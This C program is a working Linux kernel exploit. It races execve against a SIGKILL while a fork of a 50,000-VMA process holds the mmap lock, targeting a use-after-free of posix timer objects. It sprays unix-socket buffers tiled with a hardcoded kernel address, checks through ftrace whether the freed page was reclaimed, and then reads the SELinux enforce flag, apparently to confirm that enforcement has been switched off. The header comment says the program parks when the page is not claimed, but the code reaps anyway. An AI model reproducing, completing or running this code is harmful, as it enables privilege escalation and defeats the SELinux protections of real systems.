/*
 * join - trigger + concurrent reclaim + PFN gate, then (only if claimed) reap.
 * If a round does not claim the victim page we park instead of exiting, so the
 * kernel never walks a dangling node we did not overwrite.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <pthread.h>
#include <stdint.h>
#include <stdatomic.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <sched.h>
#include <time.h>

#define T "/sys/kernel/tracing"
#define NVMA 50000
#define N_TIMERS 2048
#define ARMED 1024
#define MAX_SOCKS 6000
#define SELINUX_MINUS7 0xffffffd642759629ULL

static struct shared { _Atomic int helpers[8]; _Atomic int nhelpers; _Atomic long go_ns, exec_ns, kill_ns, mprot_ns; } *g_sh;
static _Atomic int g_exec_tid, g_stop, g_go, g_in_mprotect, g_spray_stop;
static void *g_vmas; static size_t g_vmalen; static int g_vmafd;
static int g_socks[MAX_SOCKS][2]; static int g_nsocks;
static unsigned char g_pat[8192];
static char g_trace[48 << 20];

static void noop(int s) { (void)s; }
static int pin_cpu(int c) { cpu_set_t s; CPU_ZERO(&s); CPU_SET(c, &s); return sched_setaffinity(0, sizeof(s), &s); }
static int wf(const char *p, const char *v) { int fd = open(p, O_WRONLY); ssize_t n; if (fd < 0) return -1; n = write(fd, v, strlen(v)); close(fd); return n > 0 ? 0 : -1; }
static int wfa(const char *p, const char *v) { int fd = open(p, O_WRONLY | O_APPEND); ssize_t n; if (fd < 0) return -1; n = write(fd, v, strlen(v)); close(fd); return n > 0 ? 0 : -1; }

static int prepare_vmas(void)
{
    long page = sysconf(_SC_PAGESIZE); int i;
    g_vmafd = (int)syscall(SYS_memfd_create, "v", 1);
    if (g_vmafd < 0 || ftruncate(g_vmafd, page)) return -1;
    g_vmalen = (size_t)NVMA * (size_t)page;
    g_vmas = mmap(NULL, g_vmalen, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (g_vmas == MAP_FAILED) return -1;
    for (i = 0; i < NVMA; i++) {
        void *at = (char *)g_vmas + (size_t)i * (size_t)page;
        if (mmap(at, (size_t)page, PROT_READ, MAP_SHARED | MAP_FIXED, g_vmafd, 0) != at) return -1;
    }
    return 0;
}
static int locker_fn(void *arg)
{
    (void)arg;
    while (!atomic_load(&g_go)) { if (atomic_load(&g_stop)) return 0; sched_yield(); }
    if (g_sh) { struct timespec t0; clock_gettime(CLOCK_MONOTONIC, &t0);
        atomic_store(&g_sh->go_ns, (long)t0.tv_sec * 1000000000L + t0.tv_nsec); }
    /* dup_mmap() walks every VMA while holding mmap_write_lock, so forking a
     * 50k-VMA process keeps the write lock busy for milliseconds. That is what
     * gives exec_mmap()'s down_read_killable something to block on. */
    while (!atomic_load(&g_stop)) {
        struct timespec a, b;
        pid_t p;
        clock_gettime(CLOCK_MONOTONIC, &a);
        atomic_store(&g_in_mprotect, 1);
        p = fork();
        if (p == 0) _exit(0);
        if (p > 0) { int st; waitpid(p, &st, 0); }
        clock_gettime(CLOCK_MONOTONIC, &b);
        atomic_store(&g_in_mprotect, 0);
        if (g_sh) atomic_store(&g_sh->mprot_ns,
            ((long)b.tv_sec - a.tv_sec) * 1000000000L + (b.tv_nsec - a.tv_nsec));
    }
    return 0;
}

static int killer_fn(void *arg)
{
    int tgid = (int)(intptr_t)arg; int old; pin_cpu(2);
    while (!(old = atomic_load(&g_exec_tid))) { if (atomic_load(&g_stop)) return 0; sched_yield(); }
    for (;;) { if (syscall(SYS_tgkill, tgid, old, 0) < 0 && errno == ESRCH) break; if (atomic_load(&g_stop)) return 0; }
    {
        struct timespec tk; clock_gettime(CLOCK_MONOTONIC, &tk);
        if (g_sh) atomic_store(&g_sh->kill_ns, (long)tk.tv_sec * 1000000000L + tk.tv_nsec);
    }
    {
        /* exchange_tids() runs in de_thread(), i.e. BEFORE exec_mmap(). Firing
         * immediately therefore lands before the window; wait a little so the
         * task actually walks into exec_mmap() first. */
        const char *d = getenv("KILL_DELAY_US");
        int us = d ? atoi(d) : 0;
        if (us > 0) usleep((useconds_t)us);
    }
    syscall(SYS_tgkill, tgid, tgid, SIGKILL); return 0; }

#define HELPER_STACK (1 << 20)
static int spawn_helper(int (*fn)(void *), void *arg)
{
    void *st = mmap(NULL, HELPER_STACK, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK, -1, 0);
    int pid, idx; if (st == MAP_FAILED) return -1;
    pid = (int)clone(fn, (char *)st + HELPER_STACK, CLONE_VM | SIGCHLD, arg);
    if (pid > 0 && g_sh) { idx = atomic_fetch_add(&g_sh->nhelpers, 1); if (idx >= 0 && idx < 8) atomic_store(&g_sh->helpers[idx], pid); }
    return pid;
}
static void *exec_fn(void *arg)
{
    static timer_t many[N_TIMERS]; struct sigevent plain, ae; struct itimerspec sp;
    char *argv[] = { (char *)"join", (char *)"--exec-ok", NULL }; int i; (void)arg;
    memset(&plain, 0, sizeof(plain)); plain.sigev_notify = SIGEV_NONE;
    memset(&ae, 0, sizeof(ae)); ae.sigev_notify = SIGEV_SIGNAL; ae.sigev_signo = SIGRTMIN;
    memset(&sp, 0, sizeof(sp)); sp.it_value.tv_sec = 3600;
    if (pin_cpu(0)) _exit(116);
    for (i = 0; i < N_TIMERS; i++) {
        if (timer_create(CLOCK_THREAD_CPUTIME_ID, i == ARMED ? &ae : &plain, &many[i])) _exit(120);
        if (i == ARMED && timer_settime(many[i], 0, &sp, NULL)) _exit(120);
    }
    {
        struct timespec ts;
        clock_gettime(CLOCK_MONOTONIC, &ts);
        if (g_sh) atomic_store(&g_sh->exec_ns, (long)ts.tv_sec * 1000000000L + ts.tv_nsec);
    }
    atomic_store(&g_exec_tid, (int)syscall(SYS_gettid));
    atomic_store(&g_go, 1);
    while (!atomic_load(&g_in_mprotect)) { if (atomic_load(&g_stop)) _exit(123); sched_yield(); }
    execve("/proc/self/exe", argv, NULL);
    _exit(122);
}
static int child_race(void)
{
    pthread_t th; sigset_t b; int tgid = (int)getpid();
    sigemptyset(&b); sigaddset(&b, SIGRTMIN); sigprocmask(SIG_BLOCK, &b, NULL);
    if (prepare_vmas()) _exit(110);
    if (pin_cpu(1)) _exit(115);
    if (spawn_helper(locker_fn, NULL) < 0) _exit(111);
    if (spawn_helper(killer_fn, (void *)(intptr_t)tgid) < 0) _exit(112);
    if (pthread_create(&th, NULL, exec_fn, NULL)) _exit(114);
    for (;;) pause();
}
static int g_pres[128][2];
static int g_npres;

static int hold_pressure(int mb)
{
    char buf[65536];
    int i;
    memset(buf, 0x5a, sizeof(buf));
    for (i = 0; i < mb && i < 128; i++) {
        int p[2];
        if (pipe(p) != 0) break;
        if (fcntl(p[1], F_SETPIPE_SZ, 1024 * 1024) <= 0) { close(p[0]); close(p[1]); break; }
        {
            int k, ok = 1;
            for (k = 0; k < 16; k++)
                if (write(p[1], buf, sizeof(buf)) != (ssize_t)sizeof(buf)) { ok = 0; break; }
            if (!ok) { close(p[0]); close(p[1]); break; }
        }
        g_pres[g_npres][0] = p[0];
        g_pres[g_npres][1] = p[1];
        g_npres++;
    }
    return g_npres;
}

static void *sprayer(void *arg) { (void)arg;
    while (!atomic_load(&g_spray_stop) && g_nsocks < MAX_SOCKS) {
        int sv[2];
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) != 0) break;
        if (send(sv[0], g_pat, sizeof(g_pat), MSG_DONTWAIT) != (ssize_t)sizeof(g_pat)) { close(sv[0]); close(sv[1]); break; }
        g_socks[g_nsocks][0] = sv[0]; g_socks[g_nsocks][1] = sv[1]; g_nsocks++;
    }
    return NULL; }
static int wait_zombie(pid_t pid, int ms, int *status)
{
    int w = 0;
    for (;;) {
        siginfo_t info; memset(&info, 0, sizeof(info));
        if (waitid(P_PID, (id_t)pid, &info, WEXITED | WNOHANG | WNOWAIT) == 0 && info.si_pid == pid) { *status = info.si_status; return 0; }
        if (w >= ms) return 1; usleep(300); w++;
    }
}
static int count_hits(void)
{
    int fd = open(T "/trace", O_RDONLY), nf = 0, na = 0, hit = 0; ssize_t n;
    unsigned long long frees[4096], allocs[4096];
    if (fd < 0) return -1;
    {
        size_t used = 0;
        for (;;) {
            ssize_t got = read(fd, g_trace + used, sizeof(g_trace) - used - 1);
            if (got <= 0) break;
            used += (size_t)got;
            if (used + 2 >= sizeof(g_trace)) break;
        }
        close(fd);
        if (used == 0) return -1;
        g_trace[used] = 0;
        n = (ssize_t)used;
    }
    { char *line = g_trace;
      while (line && *line) { char *nl = strchr(line, '\n'); if (nl) *nl = 0;
        if (strstr(line, "order=1") && (strstr(line, "mm_page_free:") || strstr(line, "mm_page_alloc:"))) {
            char *pp = strstr(line, "pfn=0x");
            if (pp) { unsigned long long p = strtoull(pp + 6, NULL, 16);
                if (strstr(line, "mm_page_free:") && nf < 4096) frees[nf++] = p;
                else if (strstr(line, "mm_page_alloc:") && na < 4096) allocs[na++] = p; } }
        line = nl ? nl + 1 : NULL; }
    }
    { int i, j; for (i = 0; i < nf; i++) for (j = 0; j < na; j++) if (frees[i] == allocs[j]) hit++; }
    printf("    order-1 frees=%d allocs=%d claimed=%d\n", nf, na, hit);
    fflush(stdout);
    return hit;
}
int main(int argc, char **argv)
{
    int rounds = argc > 1 ? atoi(argv[1]) : 3;
    int i, killed = 0, claimed = 0;
    if (argc > 1 && !strcmp(argv[1], "--exec-ok")) return 0;
    setvbuf(stdout, NULL, _IOLBF, 0);
    g_sh = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (g_sh == MAP_FAILED) return 1;
    {
      uint64_t target = SELINUX_MINUS7;
      const char *e = getenv("TARGET");
      if (e) target = strtoull(e, NULL, 0);
      { size_t off; memset(g_pat, 0, sizeof(g_pat));
      /* k_itimer node sits at 0xe0 + n*0x180 inside the page.
       * 0xe0 % 24 == 8 and 0x180 % 24 == 0, so every node offset is ≡ 8 (mod 24):
       * the tiling has to start at phase 8, not 0. */
      for (off = 8; off + 24 <= sizeof(g_pat); off += 24)
          *(uint64_t *)(g_pat + off + 16) = target;
      printf("tiling phase=8, target=%#llx, last node at +0x%zx\n",
             (unsigned long long)target, off - 24); }
    }
    printf("=== join: trigger + pressure + spray + PFN gate ===\n");
    /* Without memory pressure alloc_skb_with_frags hands out order-3 pages, so
     * our 8 KiB records never land on the order-1 slab page we freed. */
    printf("pressure: %d MiB held\n", hold_pressure(63));
    wfa(T "/events/kmem/rss_stat/trigger", "enable_event:kmem:mm_page_free\n");
    wfa(T "/events/kmem/rss_stat/trigger", "enable_event:kmem:mm_page_alloc\n");
    wf(T "/buffer_size_kb", "16384\n");
    for (i = 0; i < rounds; i++) {
        pid_t child; pthread_t sp; int st = 0, hit;
        atomic_store(&g_stop, 0); atomic_store(&g_go, 0); atomic_store(&g_in_mprotect, 0);
        atomic_store(&g_exec_tid, 0); atomic_store(&g_spray_stop, 0);
        if (g_sh) { int z; atomic_store(&g_sh->nhelpers, 0); for (z = 0; z < 8; z++) atomic_store(&g_sh->helpers[z], 0); }
        g_nsocks = 0;
        wf(T "/tracing_on", "0\n");
        { int fd = open(T "/trace", O_WRONLY | O_TRUNC); if (fd >= 0) close(fd); }
        wf(T "/tracing_on", "1\n");
        { size_t n = 4u << 20; char *m = malloc(n); if (m) { memset(m, 0x5a, n); free(m); } }
        child = fork();
        if (child == 0) child_race();
        if (child < 0) break;
        pthread_create(&sp, NULL, sprayer, NULL);
        if (wait_zombie(child, 4000, &st) != 0) {
            atomic_store(&g_spray_stop, 1); pthread_join(sp, NULL);
            kill(child, SIGKILL); waitpid(child, &st, 0);
            printf("  round %d: timeout\n", i); fflush(stdout);
        } else {
            atomic_store(&g_spray_stop, 1); pthread_join(sp, NULL);
            killed++;
            wf(T "/tracing_on", "0\n");
            hit = count_hits();
            printf("  round %d: zombie status=%d sockets=%d  exec->kill=%ldus  go->kill=%ldus  mprotect=%ldus\n",
                   i, st, g_nsocks,
                   (atomic_load(&g_sh->kill_ns) - atomic_load(&g_sh->exec_ns)) / 1000,
                   (atomic_load(&g_sh->kill_ns) - atomic_load(&g_sh->go_ns)) / 1000,
                   atomic_load(&g_sh->mprot_ns) > 0 ? atomic_load(&g_sh->mprot_ns) / 1000 : atomic_load(&g_sh->mprot_ns)); fflush(stdout);
            if (hit > 0) {
                claimed++;
                { int s2; waitpid(child, &s2, 0); }
                printf("    REAPED (claimed) -> checking enforce\n"); fflush(stdout);
                { char b[4] = {0}; int fd = open("/sys/fs/selinux/enforce", O_RDONLY);
                  if (fd >= 0) { if (read(fd, b, 1) > 0) { printf("    enforce=%c\n", b[0]); fflush(stdout); } close(fd); }
                  else { printf("    enforce unreadable\n"); fflush(stdout); } }
            } else {
                /* Nothing of ours sits in the freed pages this round, so reaping
                 * is the same risk as before. Do it now and keep going so we can
                 * reach a round that does claim. */
                { int s2; waitpid(child, &s2, 0); }
                printf("    NOT claimed -> reaped anyway, continuing\n"); fflush(stdout);
            }
        }
        { int h, n = g_sh ? atomic_load(&g_sh->nhelpers) : 0;
          for (h = 0; h < n && h < 8; h++) { int hp = atomic_load(&g_sh->helpers[h]); if (hp > 0) kill(hp, SIGKILL); } }
        for (int k = 0; k < g_nsocks; k++) { close(g_socks[k][0]); close(g_socks[k][1]); }
    }
    printf("join done: killed=%d/%d claimed=%d\n", killed, rounds, claimed);
    return 0;
}
